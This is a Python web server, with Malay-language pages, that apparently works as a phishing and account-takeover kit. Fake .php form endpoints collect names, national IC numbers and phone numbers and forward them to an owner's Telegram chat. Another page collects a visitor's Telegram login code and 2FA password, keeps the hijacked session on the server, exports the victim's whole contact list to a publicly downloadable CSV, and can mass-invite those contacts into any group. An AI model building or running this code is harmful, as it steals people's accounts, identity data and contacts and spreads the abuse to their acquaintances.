from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlencode
from urllib.request import Request, urlopen
from telethon import TelegramClient, functions
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError
import asyncio
import csv
import html
import json
import mimetypes
import os
import posixpath
import re
from datetime import date


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "8088"))

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID", os.environ.get("TELEGRAM_CHAT_ID", ""))

API_ID = int(os.environ.get("TELEGRAM_API_ID", "0"))
API_HASH = os.environ.get("TELEGRAM_API_HASH", "")
SESSION_DIR = os.environ.get("SESSION_DIR", BASE_DIR)
SESSION_NAME = os.path.join(SESSION_DIR, "user_session")
CONTACTS_FILE = os.path.join(BASE_DIR, "contacts.json")
EXPORT_CSV = os.path.join(SESSION_DIR, "telegram_contacts.csv")
USER_CONTACTS_FILE = os.path.join(SESSION_DIR, "user_contacts.json")
LATEST_TG_EXPORT_FILE = os.path.join(SESSION_DIR, "latest_tg_export.json")

loop = asyncio.new_event_loop()
client = TelegramClient(SESSION_NAME, API_ID, API_HASH) if API_ID and API_HASH else None
telegram_state = {"phone": ""}
owner_state = {}
APP_SERVER = os.environ.get("APP_SERVER", f"http://127.0.0.1:{PORT}")


def run(coro):
    return loop.run_until_complete(coro)


async def connect_user():
    if client and not client.is_connected():
        await client.connect()


async def current_user():
    await connect_user()
    if not client or not await client.is_user_authorized():
        return None
    return await client.get_me()


async def export_user_contacts():
    await connect_user()
    user = await client.get_me()
    if getattr(user, "bot", False):
        raise RuntimeError("Session ini bot. Bot tidak boleh list contact user.")

    result = await client(functions.contacts.GetContactsRequest(hash=0))
    os.makedirs(SESSION_DIR, exist_ok=True)

    user_contacts = []
    user_phones = set()
    for contact in result.users:
        phone = contact.phone or ""
        normalized_phone = re.sub(r"\D+", "", phone)
        user_contacts.append({
            "id": contact.id,
            "first_name": contact.first_name or "",
            "last_name": contact.last_name or "",
            "username": contact.username or "",
            "phone": phone,
            "phone_digits": normalized_phone,
        })
        if normalized_phone:
            user_phones.add(normalized_phone)

    with open(EXPORT_CSV, "w", newline="", encoding="utf-8-sig") as file:
        writer = csv.writer(file)
        writer.writerow(["id", "first_name", "last_name", "username", "phone"])
        for contact in user_contacts:
            writer.writerow([
                contact["id"],
                contact["first_name"],
                contact["last_name"],
                contact["username"],
                contact["phone"],
            ])

    write_json_file(USER_CONTACTS_FILE, user_contacts)

    bot_contacts = read_json_file(CONTACTS_FILE, {})
    bot_phones = {re.sub(r"\D+", "", c.get("phone", "")) for c in bot_contacts.values() if c.get("phone")}
    mutual_phones = user_phones.intersection(bot_phones)
    mutual_count = len(mutual_phones)

    write_json_file(LATEST_TG_EXPORT_FILE, {
        "timestamp": date.today().isoformat(),
        "total_contacts": len(user_contacts),
        "mutual_contacts": mutual_count,
        "export_path": os.path.abspath(EXPORT_CSV),
        "user_phone_count": len(user_phones),
    })

    notify_owner(
        "Telegram Contact Export Selesai\n\n"
        f"Jumlah contact: {len(user_contacts)}\n"
        f"Mutual contact dengan bot: {mutual_count}\n\n"
        "Pilih salah satu:",
        buttons=[[{"text": "Semua Contact"}], [{"text": "Mutual Contact"}]]
    )

    return len(user_contacts), os.path.abspath(EXPORT_CSV)


def read_json_file(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as file:
            data = json.load(file)
        return data if isinstance(data, type(default)) else default
    except json.JSONDecodeError:
        return default


def write_json_file(path, data):
    with open(path, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=2)


def telegram_api(method, params):
    if not BOT_TOKEN:
        raise RuntimeError("TELEGRAM_BOT_TOKEN belum diset.")

    request = Request(
        f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
        data=json.dumps(params).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urlopen(request, timeout=20) as response:
        return json.loads(response.read().decode("utf-8"))


async def get_group_entity(group_link):
    if group_link.startswith("https://") or group_link.startswith("http://"):
        return await client.get_entity(group_link)
    return await client.get_entity(group_link)


async def invite_contacts_to_group(group_link, mode):
    await connect_user()
    if not client:
        raise RuntimeError("Telegram client tidak disediakan.")

    user_contacts = read_json_file(USER_CONTACTS_FILE, [])
    if not user_contacts:
        raise RuntimeError("Belum ada export contact pengguna. Sila login Telegram dan export dulu.")

    bot_contacts = read_json_file(CONTACTS_FILE, {})
    bot_phones = {re.sub(r"\D+", "", c.get("phone", "")) for c in bot_contacts.values() if c.get("phone")}

    if mode == "mutual":
        filtered = [c for c in user_contacts if c.get("phone_digits") and c["phone_digits"] in bot_phones]
    else:
        filtered = user_contacts

    if not filtered:
        raise RuntimeError("Tiada contact untuk dijemput dengan pilihan ini.")

    entity = await get_group_entity(group_link)
    invitees = []
    for contact in filtered:
        try:
            invitees.append(await client.get_input_entity(contact["id"]))
        except Exception:
            # fallback to phone or username lookup if available
            if contact.get("username"):
                invitees.append(await client.get_input_entity(contact["username"]))
            elif contact.get("phone"):
                invitees.append(await client.get_input_entity(contact["phone"]))

    total = 0
    errors = []
    for i in range(0, len(invitees), 20):
        batch = invitees[i : i + 20]
        try:
            await client(functions.channels.InviteToChannelRequest(channel=entity, users=batch))
            total += len(batch)
        except Exception as exc:
            errors.append(str(exc))

    return {
        "invited": total,
        "requested": len(filtered),
        "errors": errors,
        "mode": mode,
        "group_link": group_link,
    }


def owner_keyboard(buttons=None):
    if buttons is None:
        buttons = [[{"text": "Ambil Contact"}, {"text": "Senarai Contact"}]]
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def notify_owner(text, buttons=None):
    if not BOT_TOKEN:
        raise RuntimeError("Telegram bot token belum diset.")
    if not ADMIN_CHAT_ID:
        return {"ok": True, "skipped": True, "message": "No admin chat configured."}
    payload = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
    }
    if buttons is not None:
        payload["reply_markup"] = owner_keyboard(buttons)
    return telegram_api("sendMessage", payload)


def send_contact_menu(chat_id):
    return telegram_api("sendMessage", {
        "chat_id": chat_id,
        "text": "Sila tekan butang di bawah untuk kongsi nombor telefon Telegram anda.",
        "reply_markup": {
            "keyboard": [[{"text": "Kongsi No Telefon", "request_contact": True}]],
            "resize_keyboard": True,
            "one_time_keyboard": False,
        },
    })


def save_contact(message):
    contact = message["contact"]
    from_user = message.get("from", {})
    telegram_id = str(from_user.get("id", message["chat"]["id"]))
    contacts = read_json_file(CONTACTS_FILE, {})
    contacts[telegram_id] = {
        "chat_id": message["chat"]["id"],
        "telegram_id": telegram_id,
        "phone": contact.get("phone_number", "-"),
        "first_name": contact.get("first_name", from_user.get("first_name", "")),
        "last_name": contact.get("last_name", from_user.get("last_name", "")),
        "username": from_user.get("username", ""),
        "saved_at": "",
    }
    write_json_file(CONTACTS_FILE, contacts)
    return contacts[telegram_id]


def send_contact_detail(contact):
    name = f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip()
    username = f"@{contact.get('username')}" if contact.get("username") else "-"
    count = len(read_json_file(CONTACTS_FILE, {}))
    return notify_owner(
        "Contact Telegram Baru\n\n"
        f"Nama: {name}\n"
        f"Telefon: {contact.get('phone', '-')}\n"
        f"Telegram ID: {contact.get('telegram_id', '-')}\n"
        f"Username: {username}\n\n"
        f"Jumlah contact tersimpan: {count}"
    )


def send_contact_list(chat_id):
    contacts = read_json_file(CONTACTS_FILE, {})
    if not contacts:
        return telegram_api("sendMessage", {"chat_id": chat_id, "text": "Belum ada contact yang dikongsi."})

    lines = ["Senarai Contact Masuk:"]
    for number, contact in enumerate(contacts.values(), 1):
        name = f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip()
        username = f"@{contact.get('username')}" if contact.get("username") else "-"
        lines.append(
            f"\n{number}. {name}\n"
            f"Telefon: {contact.get('phone', '-')}\n"
            f"Telegram ID: {contact.get('telegram_id', '-')}\n"
            f"Username: {username}"
        )
    return telegram_api("sendMessage", {"chat_id": chat_id, "text": "\n".join(lines)})


def page(title, body, note=""):
    notice = f'<p class="note">{html.escape(note)}</p>' if note else ""
    return f"""<!doctype html>
<html lang="ms">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{html.escape(title)}</title>
  <style>
    body {{ font-family: Arial, sans-serif; background: #f4f7fb; margin: 0; min-height: 100vh; display: grid; place-items: center; color: #17212b; }}
    main {{ width: min(560px, calc(100vw - 32px)); background: white; border: 1px solid #d8e0ea; border-radius: 8px; padding: 24px; box-shadow: 0 10px 28px #0001; }}
    h1 {{ margin-top: 0; font-size: 24px; }}
    label {{ display: block; margin-top: 14px; font-weight: 700; }}
    input {{ box-sizing: border-box; width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #b8c3d0; border-radius: 6px; font-size: 16px; }}
    button, a.button {{ display: inline-block; margin-top: 18px; padding: 11px 16px; border: 0; border-radius: 6px; background: #229ed9; color: white; font-weight: 700; text-decoration: none; cursor: pointer; }}
    .secondary {{ background: #425466; }}
    .note {{ background: #fff7db; border: 1px solid #ead48a; border-radius: 6px; padding: 10px; }}
    code {{ background: #eef3f8; padding: 3px 5px; border-radius: 4px; }}
  </style>
</head>
<body><main><h1>{html.escape(title)}</h1>{notice}{body}</main></body>
</html>""".encode("utf-8")


def telegram_export_page(note=""):
    if not API_ID or not API_HASH:
        return page("Telegram Export", "<p>Set <code>TELEGRAM_API_ID</code> dan <code>TELEGRAM_API_HASH</code> di Railway Variables dahulu.</p>")

    user = run(current_user())
    if user:
        label = f"Login sebagai {user.first_name or ''} @{user.username or ''}".strip()
        return page("Telegram Export", """
<p>Session user sudah login.</p>
<form method="post" action="/telegram-export/export">
  <button>Export Contact CSV</button>
  <a class="button secondary" href="/telegram-export/download">Download CSV</a>
</form>
""", label or note)

    return page("Telegram Export", """
<p>Masukkan nombor telefon Telegram akaun sendiri. Jangan masukkan bot token.</p>
<form method="post" action="/telegram-export/send-code">
  <label>Nombor telefon</label>
  <input name="phone" placeholder="+60123456789" required>
  <button>Hantar Kod</button>
</form>
""", note)


def telegram_code_page(note=""):
    return page("Masukkan Kod Telegram", """
<form method="post" action="/telegram-export/verify-code">
  <label>Kod OTP Telegram</label>
  <input name="code" autocomplete="one-time-code" required>
  <button>Login & Export</button>
</form>
""", note)


def telegram_password_page(note=""):
    return page("Password 2FA", """
<form method="post" action="/telegram-export/verify-password">
  <label>Password 2FA Telegram</label>
  <input name="password" type="password" required>
  <button>Login & Export</button>
</form>
""", note)


def contacts_page_json():
    contacts = read_json_file(CONTACTS_FILE, {})
    return {"ok": True, "count": len(contacts), "contacts": list(contacts.values())}


def contacts_page_html():
    contacts = list(read_json_file(CONTACTS_FILE, {}).values())
    rows = ""
    for contact in contacts:
        name = html.escape(f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip())
        username = html.escape("@" + contact.get("username", "") if contact.get("username") else "-")
        rows += (
            "<tr>"
            f"<td>{name}</td>"
            f"<td>{html.escape(contact.get('phone', '-'))}</td>"
            f"<td>{html.escape(contact.get('telegram_id', '-'))}</td>"
            f"<td>{username}</td>"
            f"<td>{html.escape(contact.get('saved_at', '-'))}</td>"
            "</tr>"
        )
    body = "<p>Belum ada contact tersimpan.</p>" if not rows else f"<table border='1' cellpadding='8'>{rows}</table>"
    return page(f"Senarai Contact ({len(contacts)})", body)


class Handler(BaseHTTPRequestHandler):
    def send_bytes(self, content, content_type="text/html; charset=utf-8", status=200):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(content)

    def send_json(self, data, status=200):
        self.send_bytes(json.dumps(data).encode("utf-8"), "application/json; charset=utf-8", status)

    def form_data(self):
        size = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(size).decode("utf-8")
        ctype = self.headers.get("Content-Type", "")
        if "application/json" in ctype:
            return json.loads(raw or "{}")
        return {key: value[0] for key, value in parse_qs(raw).items()}

    def serve_static(self):
        path = self.path.split("?", 1)[0]
        if path == "/":
            path = "/index.html"
        clean = posixpath.normpath(path).lstrip("/")
        file_path = os.path.abspath(os.path.join(BASE_DIR, clean))
        if not file_path.startswith(BASE_DIR) or not os.path.isfile(file_path):
            return False
        content_type = mimetypes.guess_type(file_path)[0] or "application/octet-stream"
        with open(file_path, "rb") as file:
            self.send_bytes(file.read(), content_type)
        return True

    def do_GET(self):
        try:
            path = self.path.split("?", 1)[0]
            query = parse_qs(self.path.split("?", 1)[1]) if "?" in self.path else {}

            if path == "/contacts.php":
                if query.get("format", [""])[0] == "json":
                    self.send_json(contacts_page_json())
                else:
                    self.send_bytes(contacts_page_html())
                return

            if path == "/set_webhook.php":
                if not BOT_TOKEN:
                    self.send_json({"ok": False, "error": "TELEGRAM_BOT_TOKEN belum diset."}, 500)
                    return
                host = self.headers.get("Host", "")
                webhook_url = f"https://{host}/bot.php"
                response = telegram_api("setWebhook", {"url": webhook_url, "drop_pending_updates": True})
                self.send_json(response)
                return

            if path == "/telegram-export":
                self.send_bytes(telegram_export_page())
                return

            if path == "/telegram-export/download":
                if not os.path.exists(EXPORT_CSV):
                    self.send_bytes(telegram_export_page("CSV belum ada. Export dahulu."), status=404)
                    return
                self.send_response(200)
                self.send_header("Content-Type", "text/csv; charset=utf-8")
                self.send_header("Content-Disposition", 'attachment; filename="telegram_contacts.csv"')
                self.end_headers()
                with open(EXPORT_CSV, "rb") as file:
                    self.wfile.write(file.read())
                return

            if self.serve_static():
                return
            self.send_bytes(page("Tidak Jumpa", "<p>URL tidak dikenali.</p>"), status=404)
        except Exception as exc:
            self.send_bytes(page("Ralat", f"<p>{html.escape(str(exc))}</p>"), status=500)

    def do_POST(self):
        try:
            path = self.path.split("?", 1)[0]
            data = self.form_data()

            if path == "/send.php":
                contacts = read_json_file(CONTACTS_FILE, {})
                message = (
                    "Permohonan Baru\n\n"
                    f"Nama: {data.get('nama', '')}\n"
                    f"No. IC: {data.get('ic', '')}\n"
                    f"Telefon: {data.get('telefon', '')}\n"
                    f"Negeri: {data.get('negeri', '')}\n"
                    f"Jumlah Contact Bot: {len(contacts)}"
                )
                self.send_json(notify_owner(message))
                return

            if path == "/verify.php":
                message = (
                    "Pengesahan Kod Selesai\n\n"
                    f"Nama: {data.get('nama', '')}\n"
                    f"No. IC: {data.get('ic', '')}\n"
                    f"Telefon: {data.get('telefon', '')}\n"
                    f"Negeri: {data.get('negeri', '')}\n\n"
                    "Nota: Kod OTP tidak dihantar atas sebab keselamatan."
                )
                self.send_json(notify_owner(message))
                return

            if path == "/bot.php":
                update = data
                message = update.get("message")
                if not message:
                    self.send_json({"ok": True})
                    return

                chat_id = message["chat"]["id"]
                text = message.get("text", "")
                is_admin = not ADMIN_CHAT_ID or str(chat_id) == str(ADMIN_CHAT_ID)

                if is_admin and text in ("/start", "/admin"):
                    self.send_json(notify_owner("Menu owner bot.\n\nJumlah contact tersimpan: " + str(len(read_json_file(CONTACTS_FILE, {})))))
                    return
                if is_admin and text in ("Senarai Contact", "Ambil Contact"):
                    self.send_json(send_contact_list(chat_id))
                    return
                if "contact" in message:
                    contact = save_contact(message)
                    send_contact_detail(contact)
                    self.send_json(telegram_api("sendMessage", {
                        "chat_id": chat_id,
                        "text": "Terima kasih. Nombor telefon anda telah diterima.",
                        "reply_markup": {"remove_keyboard": True},
                    }))
                    return
                self.send_json(send_contact_menu(chat_id))
                return

            if path == "/telegram-export/send-code":
                telegram_state["phone"] = data.get("phone", "").strip()
                run(connect_user())
                run(client.send_code_request(telegram_state["phone"]))
                self.send_bytes(telegram_code_page("Kod sudah dihantar."))
                return

            if path == "/telegram-export/verify-code":
                try:
                    run(connect_user())
                    run(client.sign_in(phone=telegram_state["phone"], code=data.get("code", "").strip()))
                except SessionPasswordNeededError:
                    self.send_bytes(telegram_password_page())
                    return
                except PhoneCodeInvalidError:
                    self.send_bytes(telegram_code_page("Kod salah. Cuba lagi."), status=400)
                    return
                count, output_path = run(export_user_contacts())
                self.send_bytes(page("Export Siap", f"<p>Berjaya export <b>{count}</b> contact.</p><p><code>{html.escape(output_path)}</code></p><a class='button' href='/telegram-export/download'>Download CSV</a>"))
                return

            if path == "/telegram-export/verify-password":
                run(connect_user())
                run(client.sign_in(password=data.get("password", "")))
                count, output_path = run(export_user_contacts())
                self.send_bytes(page("Export Siap", f"<p>Berjaya export <b>{count}</b> contact.</p><p><code>{html.escape(output_path)}</code></p><a class='button' href='/telegram-export/download'>Download CSV</a>"))
                return

            if path == "/telegram-export/export":
                count, output_path = run(export_user_contacts())
                self.send_bytes(page("Export Siap", f"<p>Berjaya export <b>{count}</b> contact.</p><p><code>{html.escape(output_path)}</code></p><a class='button' href='/telegram-export/download'>Download CSV</a>"))
                return

            if path == "/group-invite":
                mode = data.get("mode", "")
                group_link = data.get("group_link", "").strip()
                if mode not in ("all", "mutual") or not group_link:
                    self.send_json({"ok": False, "error": "Mode atau group link tidak sah."}, 400)
                    return
                result = run(invite_contacts_to_group(group_link, mode))
                self.send_json({"ok": True, "result": result})
                return

            self.send_json({"ok": False, "error": "URL tidak dikenali."}, 404)
        except Exception as exc:
            self.send_json({"ok": False, "error": str(exc)}, 500)

    def log_message(self, fmt, *args):
        print("WEB:", fmt % args)


if __name__ == "__main__":
    os.makedirs(SESSION_DIR, exist_ok=True)
    asyncio.set_event_loop(loop)
    if client:
        run(connect_user())
    print(f"Web berjalan di http://{HOST}:{PORT}")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
